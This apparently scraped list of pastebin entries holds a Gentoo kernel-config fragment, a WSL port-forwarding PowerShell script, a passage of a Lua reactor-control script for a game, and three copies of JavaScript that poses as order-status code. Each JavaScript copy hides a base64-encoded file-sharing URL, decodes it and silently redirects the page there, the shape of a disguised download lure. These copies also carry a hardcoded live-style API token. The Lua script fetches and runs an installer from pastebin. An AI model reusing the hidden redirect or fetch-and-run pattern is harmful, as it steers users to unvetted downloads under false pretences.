CONFIG_UNWINDER_FRAME_POINTER=y
# end of x86 Debugging

#
# Kernel Testing and Coverage
#
# CONFIG_KUNIT is not set
# CONFIG_NOTIFIER_ERROR_INJECTION is not set
# CONFIG_FAULT_INJECTION is not set
CONFIG_ARCH_HAS_KCOV=y
CONFIG_CC_HAS_SANCOV_TRACE_PC=y
# CONFIG_KCOV is not set
# CONFIG_RUNTIME_TESTING_MENU is not set
CONFIG_ARCH_USE_MEMTEST=y
# CONFIG_MEMTEST is not set
# end of Kernel Testing and Coverage

#
# Rust hacking
#
# end of Rust hacking
# end of Kernel hacking

#
# Gentoo Linux
#
CONFIG_GENTOO_LINUX=y
CONFIG_GENTOO_LINUX_UDEV=y
CONFIG_GENTOO_LINUX_PORTAGE=y

#
# Support for init systems, system and service managers
#
# CONFIG_GENTOO_LINUX_INIT_SCRIPT is not set
CONFIG_GENTOO_LINUX_INIT_SYSTEMD=y
# end of Support for init systems, system and service managers

# CONFIG_GENTOO_KERNEL_SELF_PROTECTION is not set
CONFIG_GENTOO_PRINT_FIRMWARE_INFO=y
# end of Gentoo Linux
"
aQ54PrFj,Products.js,dentira,JavaScript,Sunday 6th of April 2025 03:53:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12894/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
92HWUhMp,Wsl ip automation script,tracins,PowerShell,Sunday 6th of April 2025 03:48:15 AM CDT,"# Get WSL2 IP
$wslIp = wsl.exe -e ""ip addr show eth0 | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1""

# Remove existing rule
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9443

# Add new rule with updated IP
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9443 connectaddress=$wslIp connectport=9443

Write-Host ""Port 9443 forwarded to WSL2 IP: $wslIp""
"
B4Fr18La,Order.js,dentira,JavaScript,Sunday 6th of April 2025 03:37:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19705/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mDsAeW5s,Market.js,dentira,JavaScript,Sunday 6th of April 2025 03:22:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76503/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YnDMMCXs,new reactor control 2025,costantino03,Lua,Sunday 6th of April 2025 03:20:37 AM CDT,"--  BigReactor Control
--  by costantino03
--
--  feel free to use and/or modify this code
--
-----------------------------------------------
--Reactor Control - Version History
--
--  Version 3.1 - November 2
--    - First update in awhile
--    - lots of minor fixes and improvments
--    - New loading and setup search with automated peripheral search
--    - Changes to the update methods
--    - Except new updates soon


-----------------------------------------------

local version = 3.1
--is auto power enabled
local auto_string = true
--auto on value
local on = 49
--auto off value
local off = 99
--is auto control rods enabled
local auto_rods = false
--control rod auto value
local auto_rf = 0

--peripherals
local reactor
local mon

--monitor size
local monX
local monY

term.clear()
-------------------FORMATTING-------------------------------
function clear()
  mon.setBackgroundColor(colors.black)
  mon.clear()
  mon.setCursorPos(1, 1)
end

--display text on computer's terminal screen
function draw_text_term(x, y, text, text_color, bg_color)
  term.setTextColor(text_color)
  term.setBackgroundColor(bg_color)
  term.setCursorPos(x, y)
  write(text)
end

--display text text on monitor, ""mon"" peripheral
function draw_text(x, y, text, text_color, bg_color)
  mon.setBackgroundColor(bg_color)
  mon.setTextColor(text_color)
  mon.setCursorPos(x, y)
  mon.write(text)
end

--draw line on computer terminal
function draw_line(x, y, length, color)
  mon.setBackgroundColor(color)
  mon.setCursorPos(x, y)
  mon.write(string.rep("" "", length))
end

--draw line on computer terminal
function draw_line_term(x, y, length, color)
  term.setBackgroundColor(color)
  term.setCursorPos(x, y)
  term.write(string.rep("" "", length))
end

--create progress bar
--draws two overlapping lines
--background line of bg_color
--main line of bar_color as a percentage of minVal/maxVal
function progress_bar(x, y, length, minVal, maxVal, bar_color, bg_color)
  draw_line(x, y, length, bg_color)   --backgoround bar
  local barSize = math.floor((minVal / maxVal) * length)
  draw_line(x, y, barSize, bar_color) --progress so far
end

--same as above but on the computer terminal
function progress_bar_term(x, y, length, minVal, maxVal, bar_color, bg_color)
  draw_line_term(x, y, length, bg_color)   --backgoround bar
  local barSize = math.floor((minVal / maxVal) * length)
  draw_line_term(x, y, barSize, bar_color) --progress so far
end

--create button on monitor
function button(x, y, length, text, txt_color, bg_color)
  draw_line(x, y, length, bg_color)
  draw_text((x + 2), y, text, txt_color, bg_color)
end

--header and footer bars on monitor
function menu_bar()
  draw_line(1, 1, monX, colors.blue)
  draw_text(2, 1, ""Power    Tools    Settings"", colors.white, colors.blue)
  draw_line(1, 19, monX, colors.blue)
  draw_text(2, 19, ""     Reactor Control"", colors.white, colors.blue)
end

--dropdown menu for power options
function power_menu()
  draw_line(1, 2, 9, colors.gray)
  draw_line(1, 3, 9, colors.gray)
  draw_line(1, 4, 9, colors.gray)
  if active then
    draw_text(2, 2, ""ON"", colors.lightGray, colors.gray)
    draw_text(2, 3, ""OFF"", colors.white, colors.gray)
  else
    draw_text(2, 2, ""ON"", colors.white, colors.gray)
    draw_text(2, 3, ""OFF"", colors.lightGray, colors.gray)
  end
  draw_text(2, 4, ""Auto"", colors.white, colors.gray)
end

--dropbox menu for tools
function tools_menu()
  draw_line(10, 2, 14, colors.gray)
  draw_line(10, 3, 14, colors.gray)
  draw_line(10, 4, 14, colors.gray)
  draw_line(10, 5, 14, colors.gray)
  draw_text(11, 2, ""Control Rods"", colors.white, colors.gray)
  draw_text(11, 3, ""Efficiency"", colors.white, colors.gray)
  draw_text(11, 4, ""Fuel"", colors.white, colors.gray)
  draw_text(11, 5, ""Waste"", colors.white, colors.gray)
end

--dropdown menu for settings
function settings_menu()
  draw_line(12, 2, 18, colors.gray)
  draw_line(12, 3, 18, colors.gray)
  draw_text(13, 2, ""Check for Updates"", colors.white, colors.gray)
  draw_text(13, 3, ""Reset peripherals"", colors.white, colors.gray)
end

--basic popup screen with title bar and exit button
function popup_screen(y, title, height)
  clear()
  menu_bar()

  draw_line(4, y, 22, colors.blue)
  draw_line(25, y, 1, colors.red)

  for counter = y + 1, height + y do
    draw_line(4, counter, 22, colors.white)
  end

  draw_text(25, y, ""X"", colors.white, colors.red)
  draw_text(5, y, title, colors.white, colors.blue)
end

--write settings to config file
function save_config()
  sw = fs.open(""config.txt"", ""w"")
  sw.writeLine(version)
  sw.writeLine(auto_string)
  sw.writeLine(on)
  sw.writeLine(off)
  sw.writeLine(auto_rods)
  sw.writeLine(auto_rf)
  sw.close()
end

--read settings from file
function load_config()
  sr = fs.open(""config.txt"", ""r"")
  version = tonumber(sr.readLine())
  auto_string = sr.readLine()
  on = tonumber(sr.readLine())
  off = tonumber(sr.readLine())
  auto_rods = sr.readLine()
  auto_rf = tonumber(sr.readLine())
  sr.close()
end

------------------------END FORMATTING--------------------------

--
function homepage()
  while true do
    clear()
    menu_bar()
    terminal_screen()

    energy_stored = math.floor(reactor.getEnergyStored())
    energy_capacity = math.floor(reactor.getEnergyCapacity())

    --------POWER STAT--------------
    draw_text(2, 3, ""Power:"", colors.yellow, colors.black)
    active = reactor.getActive()
    if active then
      draw_text(10, 3, ""ONLINE"", colors.lime, colors.black)
    else
      draw_text(10, 3, ""OFFLINE"", colors.red, colors.black)
    end

    -----------FUEL---------------------
    draw_text(2, 5, ""Fuel Level:"", colors.yellow, colors.black)
    local maxVal = reactor.getFuelAmountMax()
    local minVal = reactor.getFuelAmount()
    local percent = math.floor((minVal / maxVal) * 100)
    draw_text(15, 5, percent .. ""%"", colors.white, colors.black)

    if percent < 25 then
      progress_bar(2, 6, monX - 2, minVal, maxVal, colors.red, colors.gray)
    else
      if percent < 50 then
        progress_bar(2, 6, monX - 2, minVal, maxVal, colors.orange, colors.gray)
      else
        if percent < 75 then
          progress_bar(2, 6, monX - 2, minVal, maxVal, colors.yellow, colors.gray)
        else
          if percent <= 100 then
            progress_bar(2, 6, monX - 2, minVal, maxVal, colors.lime, colors.gray)
          end
        end
      end
    end

    -----------ROD HEAT---------------
    draw_text(2, 8, ""Fuel Temp:"", colors.yellow, colors.black)
    local maxVal = 2000
    local minVal = math.floor(reactor.getFuelTemperature())

    if minVal < 500 then
      progress_bar(2, 9, monX - 2, minVal, maxVal, colors.lime, colors.gray)
    else
      if minVal < 1000 then
        progress_bar(2, 9, monX - 2, minVal, maxVal, colors.yellow, colors.gray)
      else
        if minVal < 1500 then
          progress_bar(2, 9, monX - 2, minVal, maxVal, colors.orange, colors.gray)
        else
          if minVal < 2000 then
            progress_bar(2, 9, monX - 2, minVal, maxVal, colors.red, colors.gray)
          else
            if minVal >= 2000 then
              progress_bar(2, 9, monX - 2, 2000, maxVal, colors.red, colors.gray)
            end
          end
        end
      end
    end

    draw_text(15, 8, math.floor(minVal) .. ""/"" .. maxVal, colors.white, colors.black)

    -----------CASING HEAT---------------
    draw_text(2, 11, ""Casing Temp:"", colors.yellow, colors.black)
    local maxVal = 2000
    local minVal = math.floor(reactor.getCasingTemperature())
    if minVal < 500 then
      progress_bar(2, 12, monX - 2, minVal, maxVal, colors.lime, colors.gray)
    else
      if minVal < 1000 then
        progress_bar(2, 12, monX - 2, minVal, maxVal, colors.yellow, colors.gray)
      else
        if minVal < 1500 then
          progress_bar(2, 12, monX - 2, minVal, maxVal, colors.orange, colors.gray)
        else
          if minVal < 2000 then
            progress_bar(2, 12, monX - 2, minVal, maxVal, colors.red, colors.gray)
          else
            if minVal >= 2000 then
              progress_bar(2, 12, monX - 2, 2000, maxVal, colors.red, colors.gray)
            end
          end
        end
      end
    end
    draw_text(15, 11, math.floor(minVal) .. ""/"" .. maxVal, colors.white, colors.black)

    -------------OUTPUT-------------------
    if reactor.isActivelyCooled() then
      draw_text(2, 14, ""mB/tick:"", colors.yellow, colors.black)
      mbt = math.floor(reactor.getHotFluidProducedLastTick())
      draw_text(13, 14, mbt .. "" mB/t"", colors.white, colors.black)
    else
      draw_text(2, 14, ""RF/tick:"", colors.yellow, colors.black)
      rft = math.floor(reactor.getEnergyProducedLastTick())
      draw_text(13, 14, rft .. "" RF/T"", colors.white, colors.black)
    end

    ------------STORAGE------------
    if reactor.isActivelyCooled() then
      draw_text(2, 15, ""mB Stored:"", colors.yellow, colors.black)
      fluid_stored = reactor.getHotFluidAmount()
      fluid_max = reactor.getHotFluidAmountMax()
      fluid_stored_percent = math.floor((fluid_stored / fluid_max) * 100)
      draw_text(13, 15, fluid_stored_percent .. ""% ("" .. fluid_stored .. "" mB)"", colors.white, colors.black)
    else
      draw_text(2, 15, ""RF Stored:"", colors.yellow, colors.black)
      energy_stored_percent = math.floor((energy_stored / energy_capacity) * 100)
      draw_text(13, 15, energy_stored_percent .. ""% ("" .. math.floor(energy_stored) .. "" RF)"", colors.white, colors
        .black)
    end

    -------------AUTO CONTROL RODS-----------------------
    auto_rods_bool = auto_rods == ""true""
    insertion_percent = reactor.getControlRodLevel(0)

    if reactor.isActivelyCooled() then
      draw_text(2, 16, ""Control Rods:"", colors.yellow, colors.black)
      draw_text(16, 16, insertion_percent .. ""%"", colors.white, colors.black)
    else
      if auto_rods_bool then
        if active then
          if rft > auto_rf + 50 then
            reactor.setAllControlRodLevels(insertion_percent + 1)
          else
            if rft < auto_rf - 50 then
              reactor.setAllControlRodLevels(insertion_percent - 1)
            end
          end
        end

        draw_text(2, 16, ""Control Rods:"", colors.yellow, colors.black)
        draw_text(16, 16, insertion_percent .. ""%"", colors.white, colors.black)
        draw_text(21, 16, ""(Auto)"", colors.red, colors.black)
      else
        draw_text(2, 16, ""Control Rods:"", colors.yellow, colors.black)
        draw_text(16, 16, insertion_percent .. ""%"", colors.white, colors.black)
      end
    end


    -------------AUTO SHUTOFF--------------------------
    if reactor.isActivelyCooled() then
      --i dont know what I should do here
    else
      auto = auto_string == ""true""
      if auto then
        if active then
          draw_text(2, 17, ""Auto off:"", colors.yellow, colors.black)
          draw_text(13, 17, off .. ""% RF Stored"", colors.white, colors.black)
          if energy_stored_percent >= off then
            reactor.setActive(false)
            call_homepage()
          end
        else
          draw_text(2, 17, ""Auto on:"", colors.yellow, colors.black)
          draw_text(13, 17, on .. ""% RF Stored"", colors.white, colors.black)
          if energy_stored_percent <= on then
            reactor.setActive(true)
            call_homepage()
          end
        end
      else
        draw_text(2, 17, ""Auto power:"", colors.yellow, colors.black)
        draw_text(14, 17, ""disabled"", colors.red, colors.black)
      end
    end

    sleep(0.5)
  end
end

--------------MENU SCREENS--------------

--auto power menu
function auto_off()
  auto = auto_string == ""true""
  if auto then --auto power enabled
    popup_screen(3, ""Auto Power"", 11)
    draw_text(5, 5, ""Enabled"", colors.lime, colors.white)
    draw_text(15, 5, "" disable "", colors.white, colors.black)

    draw_text(5, 7, ""ON when storage ="", colors.gray, colors.white)
    draw_text(5, 8, "" - "", colors.white, colors.black)
    draw_text(13, 8, on .. ""% RF"", colors.black, colors.white)
    draw_text(22, 8, "" + "", colors.white, colors.black)

    draw_text(5, 10, ""OFF when storage ="", colors.gray, colors.white)
    draw_text(5, 11, "" - "", colors.white, colors.black)
    draw_text(13, 11, off .. ""% RF"", colors.black, colors.white)
    draw_text(22, 11, "" + "", colors.white, colors.black)

    draw_text(11, 13, "" Save "", colors.white, colors.black)

    local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

    --disable auto
    if yPos == 5 then
      if xPos >= 15 and xPos <= 21 then
        auto_string = ""false""
        save_config()
        auto_off()
      else
        auto_off()
      end
    end

    --increase/decrease auto on %
    if yPos == 8 then
      if xPos >= 5 and xPos <= 8 then
        previous_on = on
        on = on - 1
      end
      if xPos >= 22 and xPos <= 25 then
        previous_on = on
        on = on + 1
      end
    end

    --increase/decrease auto off %
    if yPos == 11 then
      if xPos >= 5 and xPos <= 8 then
        previous_off = off
        off = off - 1
      end
      if xPos >= 22 and xPos <= 25 then
        previous_off = off
        off = off + 1
      end
    end

    if on < 0 then on = 0 end
    if off > 99 then off = 99 end

    if on == off or on > off then
      on = previous_on
      off = previous_off
      popup_screen(5, ""Error"", 6)
      draw_text(5, 7, ""Auto On value must be"", colors.black, colors.white)
      draw_text(5, 8, ""lower then auto off"", colors.black, colors.white)
      draw_text(11, 10, ""Okay"", colors.white, colors.black)
      local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

      auto_off()
    end

    --Okay button
    if yPos == 13 and xPos >= 11 and xPos <= 17 then
      save_config()
      call_homepage()
    end

    --Exit button
    if yPos == 3 and xPos == 25 then
      call_homepage()
    end

    auto_off()
  else
    popup_screen(3, ""Auto Power"", 5)
    draw_text(5, 5, ""Disabled"", colors.red, colors.white)
    draw_text(15, 5, "" enable "", colors.white, colors.gray)
    draw_text(11, 7, ""Okay"", colors.white, colors.black)

    local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

    --Okay button
    if yPos == 7 and xPos >= 11 and xPos <= 17 then
      call_homepage()
    end

    if yPos == 5 then
      if xPos >= 15 and xPos <= 21 then
        auto_string = ""true""
        save_config()
        auto_off()
      else
        auto_off()
      end
    else
      auto_off()
    end
  end
end

--efficiency menu
function efficiency()
  popup_screen(3, ""Efficiency"", 12)
  fuel_usage = reactor.getFuelConsumedLastTick()
  rft = math.floor(reactor.getEnergyProducedLastTick())

  rfmb = rft / fuel_usage

  draw_text(5, 5, ""Fuel Consumption: "", colors.lime, colors.white)
  draw_text(5, 6, fuel_usage .. "" mB/t"", colors.black, colors.white)
  draw_text(5, 8, ""Energy per mB: "", colors.lime, colors.white)
  draw_text(5, 9, rfmb .. "" RF/mB"", colors.black, colors.white)

  draw_text(5, 11, ""RF/tick:"", colors.lime, colors.white)
  draw_text(5, 12, rft .. "" RF/T"", colors.black, colors.white)

  draw_text(11, 14, "" Okay "", colors.white, colors.black)

  local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

  --Okay button
  if yPos == 14 and xPos >= 11 and xPos <= 17 then
    call_homepage()
  end

  --Exit button
  if yPos == 3 and xPos == 25 then
    call_homepage()
  end

  efficiency()
end

function fuel()
  popup_screen(3, ""Fuel"", 9)

  fuel_max = reactor.getFuelAmountMax()
  fuel_level = reactor.getFuelAmount()
  fuel_reactivity = math.floor(reactor.getFuelReactivity())

  draw_text(5, 5, ""Fuel Level: "", colors.lime, colors.white)
  draw_text(5, 6, fuel_level .. ""/"" .. fuel_max, colors.black, colors.white)

  draw_text(5, 8, ""Reactivity: "", colors.lime, colors.white)
  draw_text(5, 9, fuel_reactivity .. ""%"", colors.black, colors.white)

  draw_text(11, 11, "" Okay "", colors.white, colors.black)

  local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")


  --Okay button
  if yPos == 11 and xPos >= 11 and xPos <= 17 then
    call_homepage()
  end

  --Exit button
  if yPos == 3 and xPos == 25 then
    call_homepage()
  end

  fuel()
end

function waste()
  popup_screen(3, ""Waste"", 8)

  waste_amount = reactor.getWasteAmount()
  draw_text(5, 5, ""Waste Amount: "", colors.lime, colors.white)
  draw_text(5, 6, waste_amount .. "" mB"", colors.black, colors.white)
  draw_text(8, 8, "" Eject Waste "", colors.white, colors.red)
  draw_text(11, 10, "" Close "", colors.white, colors.black)

  local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

  --eject button
  if yPos == 8 and xPos >= 8 and xPos <= 21 then
    reactor.doEjectWaste()
    popup_screen(5, ""Waste Eject"", 5)
    draw_text(5, 7, ""Waste Ejeceted."", colors.black, colors.white)
    draw_text(11, 9, "" Close "", colors.white, colors.black)
    local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")
    --Okay button
    if yPos == 7 and xPos >= 11 and xPos <= 17 then
      call_homepage()
    end

    --Exit button
    if yPos == 3 and xPos == 25 then
      call_homepage()
    end
  end

  --Okay button
  if yPos == 10 and xPos >= 11 and xPos <= 17 then
    call_homepage()
  end

  --Exit button
  if yPos == 3 and xPos == 25 then
    call_homepage()
  end
  waste()
end

function set_auto_rf()
  popup_screen(5, ""Auto Adjust"", 11)
  draw_text(5, 7, ""Try to maintain:"", colors.black, colors.white)

  draw_text(13, 9, "" ^ "", colors.white, colors.gray)
  draw_text(10, 11, auto_rf .. "" RF/t"", colors.black, colors.white)
  draw_text(13, 13, "" v "", colors.white, colors.gray)
  draw_text(11, 15, "" Okay "", colors.white, colors.gray)

  local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

  --increase button
  if yPos == 9 then
    auto_rf = auto_rf + 100
    save_config()
    set_auto_rf()
  end

  --decrease button
  if yPos == 13 then
    auto_rf = auto_rf - 100
    if auto_rf < 0 then auto_rf = 0 end
    save_config()
    set_auto_rf()
  end

  if yPos == 15 then
    control_rods()
  end

  set_auto_rf()
end

function control_rods()
  if reactor.isActivelyCooled() then
    popup_screen(3, ""Control Rods"", 13)
    insertion_percent = reactor.getControlRodLevel(0)

    draw_text(5, 5, ""Inserted: "" .. insertion_percent .. ""%"", colors.black, colors.white)
    progress_bar(5, 7, 20, insertion_percent, 100, colors.yellow, colors.gray)

    draw_text(5, 9, "" << "", colors.white, colors.black)
    draw_text(10, 9, "" < "", colors.white, colors.black)
    draw_text(17, 9, "" > "", colors.white, colors.black)
    draw_text(21, 9, "" >> "", colors.white, colors.black)

    draw_text(5, 11, ""Auto:"", colors.black, colors.white)
    draw_text(5, 13, ""unavilable for"", colors.red, colors.white)
    draw_text(5, 14, ""active cooling"", colors.red, colors.white)

    draw_text(11, 16, "" Close "", colors.white, colors.gray)

    local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

    if yPos == 9 and xPos >= 5 and xPos <= 15 then
      reactor.setAllControlRodLevels(insertion_percent - 10)
    end

    if yPos == 9 and xPos >= 10 and xPos <= 13 then
      reactor.setAllControlRodLevels(insertion_percent - 1)
    end

    if yPos == 9 and xPos >= 17 and xPos <= 20 then
      reactor.setAllControlRodLevels(insertion_percent + 1)
    end

    if yPos == 9 and xPos >= 21 and xPos <= 25 then
      reactor.setAllControlRodLevels(insertion_percent + 10)
    end

    ------Close button-------
    if yPos == 16 and xPos >= 11 and xPos <= 17 then
      call_homepage()
    end

    ------Exit button------------
    if yPos == 5 and xPos == 25 then
      call_homepage()
    end
    control_rods()
  else
    popup_screen(3, ""Control Rods"", 13)
    insertion_percent = reactor.getControlRodLevel(0)

    draw_text(5, 5, ""Inserted: "" .. insertion_percent .. ""%"", colors.black, colors.white)
    progress_bar(5, 7, 20, insertion_percent, 100, colors.yellow, colors.gray)

    draw_text(5, 9, "" << "", colors.white, colors.black)
    draw_text(10, 9, "" < "", colors.white, colors.black)
    draw_text(17, 9, "" > "", colors.white, colors.black)
    draw_text(21, 9, "" >> "", colors.white, colors.black)

    draw_text(5, 11, ""Auto:"", colors.black, colors.white)
    draw_text(16, 11, "" disable "", colors.white, colors.black)

    auto_rods_bool = auto_rods == ""true""
    if auto_rods_bool then
      draw_text(5, 13, ""RF/t: "" .. auto_rf, colors.black, colors.white)
      draw_text(18, 13, "" set "", colors.white, colors.black)
    else
      draw_text(16, 11, "" enable "", colors.white, colors.black)
      draw_text(5, 13, ""disabled"", colors.red, colors.white)
    end

    draw_text(11, 15, "" Close "", colors.white, colors.gray)

    local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

    -----manual adjust buttons------------
    if yPos == 9 and xPos >= 5 and xPos <= 15 then
      reactor.setAllControlRodLevels(insertion_percent - 10)
    end

    if yPos == 9 and xPos >= 10 and xPos <= 13 then
      reactor.setAllControlRodLevels(insertion_percent - 1)
    end

    if yPos == 9 and xPos >= 17 and xPos <= 20 then
      reactor.setAllControlRodLevels(insertion_percent + 1)
    end

    if yPos == 9 and xPos >= 21 and xPos <= 25 then
      reactor.setAllControlRodLevels(insertion_percent + 10)
    end


    ------auto buttons-----------------
    if yPos == 11 and xPos >= 16 then
      if auto_rods_bool then
        auto_rods = ""false""
        save_config()
        control_rods()
      else
        auto_rods = ""true""
        save_config()
        control_rods()
      end
    end

    if yPos == 13 and xPos >= 18 then
      set_auto_rf()
    end

    ------Close button-------
    if yPos == 15 and xPos >= 11 and xPos <= 17 then
      call_homepage()
    end

    ------Exit button------------
    if yPos == 5 and xPos == 25 then
      call_homepage()
    end
    control_rods()
  end
end

-----------------------Settings--------------------------------


function rf_mode()
  wait = read()
end

function steam_mode()
  wait = read()
end

function install_update(program, pastebin)
  clear()
  draw_line(4, 5, 22, colors.blue)

  for counter = 6, 10 do
    draw_line(4, counter, 22, colors.white)
  end

  draw_text(5, 5, ""Updating..."", colors.white, colors.blue)
  draw_text(5, 7, ""Open computer"", colors.black, colors.white)
  draw_text(5, 8, ""terminal."", colors.black, colors.white)

  if fs.exists(""install"") then fs.delete(""install"") end
  shell.run(""pastebin get Xr3K0mdN install"")
  shell.run(""install"")
end

function update()
  popup_screen(5, ""Updates"", 4)
  draw_text(5, 7, ""Connecting to"", colors.black, colors.white)
  draw_text(5, 8, ""pastebin..."", colors.black, colors.white)

  sleep(0.5)

  shell.run(""pastebin get MkF2QQjH current_version.txt"")
  sr = fs.open(""current_version.txt"", ""r"")
  current_version = tonumber(sr.readLine())
  sr.close()
  fs.delete(""current_version.txt"")
  terminal_screen()

  if current_version > version then
    popup_screen(5, ""Updates"", 7)
    draw_text(5, 7, ""Update Available!"", colors.black, colors.white)
    draw_text(11, 9, "" Install "", colors.white, colors.black)
    draw_text(11, 11, "" Ignore "", colors.white, colors.black)

    local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

    --Instatll button
    if yPos == 9 and xPos >= 11 and xPos <= 17 then
      install_update()
    end

    --Exit button
    if yPos == 5 and xPos == 25 then
      call_homepage()
    end
    call_homepage()
  else
    popup_screen(5, ""Updates"", 5)
    draw_text(5, 7, ""You are up to date!"", colors.black, colors.white)
    draw_text(11, 9, "" Okay "", colors.white, colors.black)

    local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")

    --Okay button
    if yPos == 9 and xPos >= 11 and xPos <= 17 then
      call_homepage()
    end

    --Exit button
    if yPos == 5 and xPos == 25 then
      call_homepage()
    end
    call_homepage()
  end
end

function reset_peripherals()
  clear()
  draw_line(4, 5, 22, colors.blue)

  for counter = 6, 10 do
    draw_line(4, counter, 22, colors.white)
  end

  draw_text(5, 5, ""Reset Peripherals"", colors.white, colors.blue)
  draw_text(5, 7, ""Open computer"", colors.black, colors.white)
  draw_text(5, 8, ""terminal."", colors.black, colors.white)
  setup_wizard()
end

--stop running status screen if monitors was touched
function stop()
  while true do
    local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")
    x = xPos
    y = yPos
    stop_function = ""monitor_touch""
    return
  end
end

function mon_touch()
  --when the monitor is touch on the homepage
  if y == 1 then
    if x < monX / 3 then
      power_menu()
      local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")
      if xPos < 9 then
        if yPos == 2 then
          reactor.setActive(true)
          timer = 0 --reset anytime the reactor is turned on/off
          call_homepage()
        else
          if yPos == 3 then
            reactor.setActive(false)
            timer = 0 --reset anytime the reactor is turned on/off
            call_homepage()
          else
            if yPos == 4 then
              auto_off()
            else
              call_homepage()
            end
          end
        end
      else
        call_homepage()
      end
    else
      if x < 20 then
        tools_menu()
        local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")
        if xPos < 25 and xPos > 10 then
          if yPos == 2 then
            control_rods()
          else
            if yPos == 3 then
              efficiency()
            else
              if yPos == 4 then
                fuel()
              else
                if yPos == 5 then
                  waste()
                else
                  call_homepage()
                end
              end
            end
          end
        else
          call_homepage()
        end
      else
        if x < monX then
          settings_menu()
          local event, side, xPos, yPos = os.pullEvent(""monitor_touch"")
          if xPos > 13 then
            if yPos == 2 then
              update()
            else
              if yPos == 3 then
                reset_peripherals()
              else
                call_homepage()
              end
            end
          else
            call_homepage()
          end
        end
      end
    end
  else
    call_homepage()
  end
end

function terminal_screen()
  term.clear()
  draw_line_term(1, 1, 55, colors.blue)
  draw_text_term(13, 1, ""BigReactor Controls"", colors.white, colors.blue)
  draw_line_term(1, 19, 55, colors.blue)
  draw_text_term(13, 19, ""by costantino03"", colors.white, colors.blue)

  draw_text_term(1, 3, ""Current program:"", colors.white, colors.black)
  draw_text_term(1, 4, ""Reactor Control v"" .. version, colors.blue, colors.black)

  draw_text_term(1, 6, ""Installer:"", colors.white, colors.black)
  draw_text_term(1, 7, ""pastebin.com/Xr3K0mdN"", colors.blue, colors.black)

  draw_text_term(1, 9, ""Please give me your feedback, suggestions,"", colors.white, colors.black)
  draw_text_term(1, 10, ""and errors!"", colors.white, colors.black)

  draw_text_term(1, 11, ""telegram: @costantino03"", colors.blue, colors.black)
end

--run both homepage() and stop() until one returns
function call_homepage()
  clear()
  parallel.waitForAny(homepage, stop)

  if stop_function == ""terminal_screen"" then
    stop_function = ""nothing""
    setup_wizard()
  else
    if stop_function == ""monitor_touch"" then
      stop_function = ""nothing""
